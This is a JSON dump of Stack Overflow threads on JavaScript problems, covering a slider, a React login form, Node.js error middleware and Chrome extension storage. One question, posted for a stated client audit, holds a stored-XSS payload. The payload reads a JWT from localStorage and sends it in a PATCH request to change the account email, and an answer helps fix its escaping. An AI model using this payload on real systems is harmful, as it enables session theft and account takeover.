${item.isFeatured ? 'featured' : ''} ${item.isSemiExclusive ? 'semiExclusive' : ''}\" data-id=${item.id}&gt;\n          &lt;div style=\"position: relative\"&gt;\n            &lt;img src=${\n                                item.thumbnailURL\n                            } class=\"card-img-top\" alt=${item.projectName} draggable=\"false\"/&gt;\n            &lt;div class=\"card-more-details\"&gt;\n              &lt;p class=\"helper-text\"&gt;Click For More Details&lt;/p&gt;\n              ${\n                                    item.isExclusive\n                                        ? '&lt;span class=\"badge badge-warning mb-2\"&gt;Exclusive Build&lt;/span&gt;'\n                                        : ''\n                                }\n              ${\n                                    item.isSemiExclusive\n                                        ? '&lt;span class=\"badge badge-danger mb-2\"&gt;Semi-Exclusive Build&lt;/span&gt;'\n                                        : ''\n                                }\n              ${\n                                    item.isOnSale\n                                        ? '&lt;span class=\"badge badge-success mb-2\"&gt;On Sale&lt;/span&gt;'\n                                        : ''\n                                }\n              ${\n                                    item.isFeatured\n                                        ? '&lt;span class=\"badge badge-info mb-2\"&gt;Featured&lt;/span&gt;'\n                                        : ''\n                                }\n            &lt;/div&gt;\n          &lt;/div&gt;\n          &lt;div class=\"card-body card-shop-body\"&gt;\n            &lt;div&gt;\n              &lt;h5 class=\"card-title-shop text-center\"&gt;\n                ${item.projectName}\n              &lt;/h5&gt;\n\n              &lt;p class=\"card-price text-center\"&gt;$${item.price}&lt;/p&gt;\n            &lt;/div&gt;\n          &lt;/div&gt;\n\n        &lt;/div&gt;`);\n                });\n</code></pre>\n\n<p>I expect to only see one \"shop-card\" in the slider.</p>\n\n<p>The actual output is 3 cards in the slider.</p>\n\n<p>Debug information: <a href=\"https://i.stack.imgur.com/PFuD1.png\" rel=\"nofollow noreferrer\">Chrome w/ Dev console</a></p>\n\n<p>Full index.html available <a href=\"https://hastebin.com/obuhoqikin.xml\" rel=\"nofollow noreferrer\">here</a> (for further scrutiny)</p>\n"}, {"tags": ["javascript", "json", "http", "security", "xss"], "comments": [{"owner": {"reputation": 12382, "user_id": 707451, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65a47c94af57fb83fb6489ea5d2cedcc?s=128&d=identicon&r=PG", "display_name": "shaochuancs", "link": "https://stackoverflow.com/users/707451/shaochuancs"}, "edited": false, "score": 0, "creation_date": 1558602861, "post_id": 56264374, "comment_id": 99158555, "body": "You can remove all line breaks and store <code>html</code> string as a one-line compact text."}, {"owner": {"reputation": 1, "user_id": 11541403, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Z2WExArCNF4/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3reKeZA8CvbOq0goKeBG_nQq9IHwBg/mo/photo.jpg?sz=128", "display_name": "virat king", "link": "https://stackoverflow.com/users/11541403/virat-king"}, "reply_to_user": {"reputation": 12382, "user_id": 707451, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65a47c94af57fb83fb6489ea5d2cedcc?s=128&d=identicon&r=PG", "display_name": "shaochuancs", "link": "https://stackoverflow.com/users/707451/shaochuancs"}, "edited": false, "score": 0, "creation_date": 1558671518, "post_id": 56264374, "comment_id": 99184744, "body": "@shaochuancs thanks for replying, in html there is also a place where double quotes are there var body=&#39;{\\&quot;email\\&quot;:\\&quot;xxx@xxx.com\\&quot;}; ,  so if its in double quote it will break the outside json and the request will give a invalid payload message. And also it itself is json so it also must contain double quotes. Any solution?"}, {"owner": {"reputation": 12382, "user_id": 707451, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65a47c94af57fb83fb6489ea5d2cedcc?s=128&d=identicon&r=PG", "display_name": "shaochuancs", "link": "https://stackoverflow.com/users/707451/shaochuancs"}, "edited": false, "score": 0, "creation_date": 1558675863, "post_id": 56264374, "comment_id": 99185679, "body": "The double quote in <code>body</code> is not necessary, please check my answer."}], "answers": [{"tags": [], "owner": {"reputation": 12382, "user_id": 707451, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/65a47c94af57fb83fb6489ea5d2cedcc?s=128&d=identicon&r=PG", "display_name": "shaochuancs", "link": "https://stackoverflow.com/users/707451/shaochuancs"}, "is_accepted": false, "score": 0, "last_activity_date": 1558675802, "creation_date": 1558675802, "answer_id": 56286357, "question_id": 56264374, "link": "https://stackoverflow.com/questions/56264374/quotes-on-xmlhttp-post-json-datajavascript-giving-some-errors-when-send-inside/56286357#56286357", "title": "quotes on xmlhttp post json data(javascript) giving some errors when send inside another json variable", "body": "<p>There are 2 problems in your payload:</p>\n\n<ol>\n<li><p>For value of <code>html</code> field, no line break should be introduced -- it will cause \"unescaped line break\" error. You can remove all line breaks and store <code>html</code> string as a one-line compact text.</p></li>\n<li><p>For <code>body</code> in the payload, it can be a plain JavaScript object, such as <code>var body={email:'xxx@xxx.com'};</code> -- in the next code line, it would be converted to JSON string via <code>JSON.stringify(body)</code>, the double quote is not necessary.</p></li>\n</ol>\n"}], "owner": {"reputation": 1, "user_id": 11541403, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-Z2WExArCNF4/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3reKeZA8CvbOq0goKeBG_nQq9IHwBg/mo/photo.jpg?sz=128", "display_name": "virat king", "link": "https://stackoverflow.com/users/11541403/virat-king"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 211, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1573214486, "creation_date": 1558556234, "last_edit_date": 1573214486, "question_id": 56264374, "link": "https://stackoverflow.com/questions/56264374/quotes-on-xmlhttp-post-json-datajavascript-giving-some-errors-when-send-inside", "title": "quotes on xmlhttp post json data(javascript) giving some errors when send inside another json variable", "body": "<p>I am doing a audit on a web application for vulnerabilities for a client. I found some xss but I want to escalate it more but the problem I am facing is that the data is sent inside json. And now when I am introducing xmlhttp request inside it which needs double quotes to send its POST data. Thats where the problem is coming in escaping those quotes.</p>\n\n<p>I tried escaping it with two backslashes but that failed the request. But when I sent the request with one backslash in payload the request succeeded but javascript execution failed</p>\n\n<p>So basically the problem is data is sent like this : </p>\n\n<p>POST\n{\"x\":\"y\",\"html\":\"javascript code\"}</p>\n\n<p>My payload of xss is this :</p>\n\n<pre><code>POST \n\nDATA\n{\"x\":\"y\",\"html\":\"&lt;svg onload=\\\"var token=localStorage.getItem('murally.jwt');\nalert(token);\nvar xhr=new XMLHttpRequest();xhr.open('PATCH','https://x.com',true);\nxhr.setRequestHeader('Accept', 'application/json');xhr.setRequestHeader('Content-Type','application/json; charset=utf-8');\nxhr.setRequestHeader('Authorization', 'Bearer ' + token);var body='{\\\"email\\\":\\\"xxx@xxx.com\\\"}';\nxhr.send(JSON.stringify(body));\nxhr.onreadystatechange = function() { if (this.readyState == 4 &amp;&amp; this.status \n== 200) { alert(xhr.responseText) }};\\\"/&gt;\"}\n</code></pre>\n\n<p>Now in this I am stuck from two sides:</p>\n\n<p>1) When I send the same code as above in request, data get stored on server side but when I load the page where this get stored, there is error in console that SyntaxError: '' string literal contains an unescaped line break, so my payload didnt works and fail.</p>\n\n<p>2) After searching for it on internet I found a solution for above that I need to double escape the quotes on post data for the browser to parse it correctly,but when I send that request again with double backslashes another problem arised that the request failed with error\n{\"error\":\"INVALID_PAYLOAD\",\"message\":\"Malformed JSON\"}</p>\n\n<p>So now I have to somehow make that request to work properly bypassing both the errors, is there nay solution to this. I am not much in the development side so if any help would be highly appreciated. I want to show my client a high impact of xss that how xss can lead to account takeover. If there is a way to mitigate these both problems with proper escaping then please help me.\nIf you need more information feel free to ask.</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["javascript", "reactjs", "rendering"], "answers": [{"comments": [{"owner": {"reputation": 63, "user_id": 10942068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d6f355f9d7141baa3d88491ee745710?s=128&d=identicon&r=PG&f=1", "display_name": "wtsegars", "link": "https://stackoverflow.com/users/10942068/wtsegars"}, "edited": false, "score": 0, "creation_date": 1558556933, "post_id": 56264477, "comment_id": 99145445, "body": "I tried this but it didn&#39;t seem to work for some reason."}], "tags": [], "owner": {"reputation": 35, "user_id": 5230448, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/917ba177861c57e67aa3ff47ba86eff6?s=128&d=identicon&r=PG&f=1", "display_name": "Nick Codes", "link": "https://stackoverflow.com/users/5230448/nick-codes"}, "is_accepted": false, "score": 0, "last_activity_date": 1558556630, "creation_date": 1558556630, "answer_id": 56264477, "question_id": 56264352, "link": "https://stackoverflow.com/questions/56264352/how-do-i-get-this-react-form-to-render-onto-my-page/56264477#56264477", "title": "How do I get this React form to render onto my page?", "body": "<p>Add brackets around the component in the render method</p>\n\n<pre><code>ReactDOM.render(&lt;LoginForm /&gt;, document.getElementById(\"front_form\"));\n</code></pre>\n\n<p>Also make sure that the front_form element exists. </p>\n"}, {"comments": [{"owner": {"reputation": 63, "user_id": 10942068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d6f355f9d7141baa3d88491ee745710?s=128&d=identicon&r=PG&f=1", "display_name": "wtsegars", "link": "https://stackoverflow.com/users/10942068/wtsegars"}, "edited": false, "score": 0, "creation_date": 1558556955, "post_id": 56264492, "comment_id": 99145451, "body": "I tried this as well but it didn&#39;t seem to work either"}], "tags": [], "owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "is_accepted": false, "score": 0, "last_activity_date": 1558556690, "creation_date": 1558556690, "answer_id": 56264492, "question_id": 56264352, "link": "https://stackoverflow.com/questions/56264352/how-do-i-get-this-react-form-to-render-onto-my-page/56264492#56264492", "title": "How do I get this React form to render onto my page?", "body": "<p>You want to render an instance of <code>LoginForm</code>:</p>\n\n<pre><code> ReactDOM.render(\n  &lt;LoginForm /&gt;, // &lt;&lt;&lt;\n  document.getElementById(\"front_form\")\n);\n</code></pre>\n\n<p>I'm surprised that this does not throw an error though.</p>\n"}, {"tags": [], "owner": {"reputation": 154, "user_id": 10100750, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2fc34100f0298f73f5007e1e0fdeb3ef?s=128&d=identicon&r=PG&f=1", "display_name": "Anuj Ladia", "link": "https://stackoverflow.com/users/10100750/anuj-ladia"}, "is_accepted": false, "score": 0, "last_activity_date": 1558561721, "creation_date": 1558561721, "answer_id": 56265472, "question_id": 56264352, "link": "https://stackoverflow.com/questions/56264352/how-do-i-get-this-react-form-to-render-onto-my-page/56265472#56265472", "title": "How do I get this React form to render onto my page?", "body": "<p><a href=\"https://jsfiddle.net/anujladia/zv4893gt/\" rel=\"nofollow noreferrer\">https://jsfiddle.net/anujladia/zv4893gt/</a></p>\n\n<p>This is the working fiddle for the above problem. The form is getting rendered. \nThere is 1 important change that will make the form get rendered.</p>\n\n<pre><code>ReactDOM.render(&lt;LoginForm /&gt;,\n  document.getElementById(\"app\")\n);\n</code></pre>\n\n<p>Since you have already tried this, I would ask you to check the id [front_form] also where you are trying to insert this form. Possibly, that can also be wrong.</p>\n\n<p>Hope so this works.\nIf yes then continue.</p>\n\n<p>Since you are new to react. I found other problems also which I would like to correct here.</p>\n\n<ol>\n<li>In handleInputChange, value will be target.value</li>\n<li>class will be className</li>\n<li>for will be htmlFor</li>\n<li>In react you don't need to add required=\"true\", just adding required will be enough.</li>\n</ol>\n\n<p>2, 3, 4 you would have been getting on console also.</p>\n"}], "owner": {"reputation": 63, "user_id": 10942068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d6f355f9d7141baa3d88491ee745710?s=128&d=identicon&r=PG&f=1", "display_name": "wtsegars", "link": "https://stackoverflow.com/users/10942068/wtsegars"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 28, "favorite_count": 0, "answer_count": 3, "score": 0, "last_activity_date": 1558561721, "creation_date": 1558556141, "question_id": 56264352, "link": "https://stackoverflow.com/questions/56264352/how-do-i-get-this-react-form-to-render-onto-my-page", "title": "How do I get this React form to render onto my page?", "body": "<p>As a preface I'm very new to using React.js so I'm still very much learning the basics of how to use React. I am trying to get this React form to render on my webpage but for some reason it isn't rendering. This is quite literally the very first thing I've done on React so if I really messed up I apologize in advanced.</p>\n\n<p>I've added extensions into my browser that will allow React to render along with doing some slight modifications to my code that got rid of all of the errors on the console within in the browser that I am using (Google Chrome), but yet the form is still not rendering. </p>\n\n<pre><code>    const React = require(\"react\");\n    const ReactDOM = require(\"react-dom\");\n\n    class LoginForm extends React.Component {\nconstructor(props) {\n    super(props);\n    this.state = {\n        userName: \"\",\n        password: \"\"\n    };\n\n    this.handleInputChange = this.handleInputChange.bind(this);\n}\n\nhandleInputChange(event) {\n    const target = event.target;\n    const value = target.type === \"text\";\n    const name = target.name;\n    this.setState({\n        [name]: value\n        // userName: event.target.userName,\n        // password: event.target.password\n    });\n}\n\nrender() {\n    return (\n        &lt;form class=\"col s12\" method=\"POST\"&gt;\n            &lt;div class=\"row\"&gt;\n                &lt;div class=\"input-field col s12\"&gt;\n                    &lt;input\n                        name=\"userName\"\n                        id=\"username\"\n                        type=\"text\"\n                        class=\"validate\"\n                        value={this.state.userName}\n                        onChange={this.handleInputChange}\n                        required=\"true\"\n                        aria-required=\"true\" /&gt;\n                    &lt;label for=\"username\"&gt;\n                        Username\n                    &lt;/label&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n            &lt;div class=\"row\"&gt;\n                &lt;div class=\"input-field col s12\"&gt;\n                    &lt;input\n                        name=\"password\"\n                        id=\"password\"\n                        type=\"password\"\n                        class=\"validate\"\n                        value={this.state.password}\n                        onChange={this.handleInputChange}\n                        required=\"true\"\n                        aria-required=\"true\" /&gt;\n                    &lt;label for=\"password\"&gt;\n                        Password\n                    &lt;/label&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n            &lt;div class=\"row\"&gt;\n                &lt;div class=\"input-field col s12\"&gt;\n                    &lt;button id=\"loginBtn\" class=\"waves-effect waves-light btn\" type=\"submit\" formaction=\"/login\"&gt;\n                        Login\n                    &lt;/button&gt;\n                    &lt;button id=\"signupBtn\" class=\"waves-effect waves-light btn\" type=\"submit\" formaction=\"/signup\"&gt;\n                        SignUp\n                    &lt;/button&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/form&gt;\n    );\n}\n    }\n\n    ReactDOM.render(LoginForm, document.getElementById(\"front_form\"));\n</code></pre>\n\n<p>As stated before I'm not getting any more errors within the browser console, the only problem is that the form isn't rendering.</p>\n"}, {"tags": ["javascript", "node.js", "error-handling"], "comments": [{"owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558556573, "post_id": 56264349, "comment_id": 99145270, "body": "You are not <code>await</code> ing the call to <code>registerNewUser(body)</code> ..."}, {"owner": {"reputation": 626, "user_id": 10486614, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9a4a18c7ee6d75d7ba96aa540d9160c?s=128&d=identicon&r=PG&f=1", "display_name": "MoSwilam", "link": "https://stackoverflow.com/users/10486614/moswilam"}, "reply_to_user": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558556910, "post_id": 56264349, "comment_id": 99145432, "body": "nope, I am in fact using await when calling it, this is from the userController.js <code>exports.register = async(req, res) =&gt; await registerNewUser(req.body)</code>, so yeah thats not where the issue is, any other thoughts ?"}, {"owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558557309, "post_id": 56264349, "comment_id": 99145596, "body": "Thats exactly where the issue is (probably). Where do you call that <code>register</code> function?"}, {"owner": {"reputation": 626, "user_id": 10486614, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9a4a18c7ee6d75d7ba96aa540d9160c?s=128&d=identicon&r=PG&f=1", "display_name": "MoSwilam", "link": "https://stackoverflow.com/users/10486614/moswilam"}, "reply_to_user": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558557345, "post_id": 56264349, "comment_id": 99145613, "body": "what exactly do you see?"}, {"owner": {"reputation": 626, "user_id": 10486614, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9a4a18c7ee6d75d7ba96aa540d9160c?s=128&d=identicon&r=PG&f=1", "display_name": "MoSwilam", "link": "https://stackoverflow.com/users/10486614/moswilam"}, "reply_to_user": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558557518, "post_id": 56264349, "comment_id": 99145675, "body": "remember, this is just a controller file, the <code>register</code> the gets exported here, is imported in the userRoutes.js file, so express <code>router.post(&#39;&#47;register&#39;, register)</code> redirects the request to the controller, then to the userService.js! I hope you are following"}, {"owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558557564, "post_id": 56264349, "comment_id": 99145696, "body": "Yes I do. However you are never calling <code>next()</code> in <code>register</code>. You also don&#39;t send anything to the client"}, {"owner": {"reputation": 626, "user_id": 10486614, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9a4a18c7ee6d75d7ba96aa540d9160c?s=128&d=identicon&r=PG&f=1", "display_name": "MoSwilam", "link": "https://stackoverflow.com/users/10486614/moswilam"}, "reply_to_user": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558557749, "post_id": 56264349, "comment_id": 99145773, "body": "well, I think I am throwing a new Error Object by the <code>errorThrower</code> function, then in the app.js file I am using the <code>errorHandler</code> which catches the error, check the errorCode, then return an object with the code along with the message, but yeah I am not sure where to call <code>next()</code> actualy"}, {"owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558559194, "post_id": 56264349, "comment_id": 99146360, "body": "Again: Where are you actually sending a response to the client?"}, {"owner": {"reputation": 626, "user_id": 10486614, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9a4a18c7ee6d75d7ba96aa540d9160c?s=128&d=identicon&r=PG&f=1", "display_name": "MoSwilam", "link": "https://stackoverflow.com/users/10486614/moswilam"}, "reply_to_user": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558559401, "post_id": 56264349, "comment_id": 99146439, "body": "@JonasWilms, second snipeet, second func, at the end of errorHandler I call: res.status(status).json({...})"}, {"owner": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558559578, "post_id": 56264349, "comment_id": 99146517, "body": "And if there is no error?"}, {"owner": {"reputation": 626, "user_id": 10486614, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9a4a18c7ee6d75d7ba96aa540d9160c?s=128&d=identicon&r=PG&f=1", "display_name": "MoSwilam", "link": "https://stackoverflow.com/users/10486614/moswilam"}, "reply_to_user": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558559626, "post_id": 56264349, "comment_id": 99146535, "body": "I only get the error message in the console, nothing returns to the client!"}, {"owner": {"reputation": 626, "user_id": 10486614, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9a4a18c7ee6d75d7ba96aa540d9160c?s=128&d=identicon&r=PG&f=1", "display_name": "MoSwilam", "link": "https://stackoverflow.com/users/10486614/moswilam"}, "reply_to_user": {"reputation": 105033, "user_id": 5260024, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/XxSHe.jpg?s=128&g=1", "display_name": "Jonas Wilms", "link": "https://stackoverflow.com/users/5260024/jonas-wilms"}, "edited": false, "score": 0, "creation_date": 1558559671, "post_id": 56264349, "comment_id": 99146562, "body": "sorry what do you mean if there is no error?"}], "answers": [{"comments": [{"owner": {"reputation": 626, "user_id": 10486614, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9a4a18c7ee6d75d7ba96aa540d9160c?s=128&d=identicon&r=PG&f=1", "display_name": "MoSwilam", "link": "https://stackoverflow.com/users/10486614/moswilam"}, "edited": false, "score": 0, "creation_date": 1558591287, "post_id": 56265168, "comment_id": 99152999, "body": "that worked, thank you, but it&#39;s not a very optimal solution,  I need a little helper function as middleware to be applied across the application so I don&#39;t have to try and catch for every single route, any thoughts? thanks anyway)"}], "tags": [], "owner": {"reputation": 15255, "user_id": 3761628, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/9414f7276059e8c1c63214430338ad7e?s=128&d=identicon&r=PG&f=1", "display_name": "eol", "link": "https://stackoverflow.com/users/3761628/eol"}, "is_accepted": false, "score": 1, "last_activity_date": 1558609324, "last_edit_date": 1558609324, "creation_date": 1558559999, "answer_id": 56265168, "question_id": 56264349, "link": "https://stackoverflow.com/questions/56264349/node-js-error-handling-setup-not-working-as-intended/56265168#56265168", "title": "Node.js error handling setup not working as intended", "body": "<p>You're not catching the error which you throw inside your <code>errorThrower</code>, thus getting the error <code>UnhandledPromiseRejectionWarning</code>. What you need to do is catch the error and pass it on the the next middleware, in order for the <code>errorHandler</code>-middleware to be able to actually handle the error. Something like this:</p>\n\n<pre><code>exports.register = async(req, res) =&gt; {\n   try {\n       await registerNewUser(req.body);\n   } catch(err) {\n       next(err);\n   }\n};\n</code></pre>\n\n<p>If you don't want to do this for every middleware, you could create a \"base\"-middleware which handles this:</p>\n\n<pre><code>const middlewareExecutor = async (req, res, next, fn) =&gt; {\n    try {\n        return await fn.call(fn, req, res, next);\n    } catch (err) {\n        next(err);\n    }\n};\n</code></pre>\n\n<p>Now you can pass your middlewares as an argument and delegate handling the error to the executor:</p>\n\n<pre><code>app.use('/user' , async (req, res, next) =&gt; middlewareExecutor(req, res, next, user));\n</code></pre>\n"}], "owner": {"reputation": 626, "user_id": 10486614, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e9a4a18c7ee6d75d7ba96aa540d9160c?s=128&d=identicon&r=PG&f=1", "display_name": "MoSwilam", "link": "https://stackoverflow.com/users/10486614/moswilam"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 31, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1558609324, "creation_date": 1558556130, "last_edit_date": 1558556502, "question_id": 56264349, "link": "https://stackoverflow.com/questions/56264349/node-js-error-handling-setup-not-working-as-intended", "title": "Node.js error handling setup not working as intended", "body": "<p>I am trying to have all my error messages in one file, each error is denoted by an error code, then in my functions/services, when there is an error, I call a function that takes the error code as an argument, then returns an object to the client with the error code and the respective error message from the errors.js file.\nas an example, a user trying to register with an email that already exists in the database, here is how I try to do it:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>// userService.js -- where my register function is\r\nconst { errorThrower } = require('../../utils/errorHandlers');\r\n...\r\nstatic async registerNewUser(body) {\r\n  const exists = await User.where({ email: body.email }).fetch();\r\n  if(exists) {\r\n    errorThrower('400_2');\r\n  }\r\n  ...\r\n}</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>errorHandlers.js file:</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>exports.errorThrower = (errCode) =&gt; {\r\n    throw Object.assign(new Error(errors[errorCode]), { errorCode })\r\n}\r\n\r\nexports.errorHandler = (err, req, res, next) =&gt; {\r\n    if(!err.status &amp;&amp; err.errorCode) {\r\n      err.status = parseInt(err.errorCode.toString().substring(0, 3), 10);\r\n    }\r\n    \r\n    let status, message\r\n    if (err.status) {\r\n      status = err.status\r\n      message = err.message\r\n    } else {\r\n      status = 500;\r\n      message = 'unexpected behavior, Kindly contact our support team!'\r\n    }\r\n    \r\n    res.status(status).json({\r\n      errorCode: err.errorCode,\r\n      message\r\n    })\r\n}</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>errors.js \n<div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>module.exports = {\r\n    '400_1': 'JSON payload is not valid',\r\n    '400_2': 'user already registered',\r\n    ...\r\n}</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-js lang-js prettyprint-override\"><code>...\r\nconst user = require('./routes/user');\r\nconst { errorHandler } = require('../utils/errors');\r\n\r\n...\r\napp.use('/user' , user);\r\napp.use(errorHandler);\r\n...</code></pre>\r\n</div>\r\n</div>\r\n</p>\n\n<p>now with this setup, when hitting the register endpoint by postman, I only get the following in the console </p>\n\n<blockquote>\n  <p>UnhandledPromiseRejectionWarning: Error: user already registered</p>\n</blockquote>\n\n<p>could someone please tell me what am I missing here?\nthanks in advance!</p>\n"}, {"tags": ["javascript", "google-chrome-extension"], "comments": [{"owner": {"reputation": 1037, "user_id": 4374150, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ODuVG.jpg?s=128&g=1", "display_name": "Paula Livingstone", "link": "https://stackoverflow.com/users/4374150/paula-livingstone"}, "edited": false, "score": 0, "creation_date": 1558556189, "post_id": 56264343, "comment_id": 99145068, "body": "Create the popup on page load but keep it hidden until you need it"}, {"owner": {"reputation": 137, "user_id": 11541482, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-ZUbnfpXrdVA/AAAAAAAAAAI/AAAAAAAAABE/g1lSMuM37RE/photo.jpg?sz=128", "display_name": "Eugene Chefranov", "link": "https://stackoverflow.com/users/11541482/eugene-chefranov"}, "reply_to_user": {"reputation": 1037, "user_id": 4374150, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ODuVG.jpg?s=128&g=1", "display_name": "Paula Livingstone", "link": "https://stackoverflow.com/users/4374150/paula-livingstone"}, "edited": false, "score": 0, "creation_date": 1558556729, "post_id": 56264343, "comment_id": 99145350, "body": "@PaulaLivingstone popup.html is part of chrome extension. It works another way"}], "answers": [{"tags": [], "owner": {"reputation": 151, "user_id": 11428102, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0e9d81f71591bd60673618f1d2bf9bad?s=128&d=identicon&r=PG&f=1", "display_name": "Conor Retra", "link": "https://stackoverflow.com/users/11428102/conor-retra"}, "is_accepted": false, "score": 2, "last_activity_date": 1558563725, "creation_date": 1558563725, "answer_id": 56265735, "question_id": 56264343, "link": "https://stackoverflow.com/questions/56264343/how-to-send-data-between-background-js-and-popup-js-if-popup-is-closed/56265735#56265735", "title": "How to send data between background.js and popup.js if popup is closed?", "body": "<p>Once the popup is gone, not only is the port closed, but the popup.js script is no longer running. You can either store the content in the background.js script (persistent) and each time the popup is loaded, send the relevant information (you already have this partially built out), or you can store the information in local storage and load it every time your popup is loaded.</p>\n\n<p><strong>popup.js</strong> or <strong>background.js</strong></p>\n\n<pre><code>chrome.storage.sync.set({'dataValue1': 'Some data 1.'});\nchrome.storage.sync.set({'dataValue2': 'Some data 2.'});\n</code></pre>\n\n<p><strong>popup.js</strong></p>\n\n<pre><code>function updatePopup(){\n  chrome.storage.sync.get(['dataValue1','dataValue2'], function(data) {\n    //Update popupElement1 and popupElement2 with loaded data\n    document.getElementById(\"popupElement1\").value = data.dataValue1;\n    document.getElementById(\"popupElement2\").value = data.dataValue2;\n\n  });\n}\n\ndocument.addEventListener('DOMContentLoaded', updatePopup);\n</code></pre>\n"}], "owner": {"reputation": 137, "user_id": 11541482, "user_type": "registered", "profile_image": 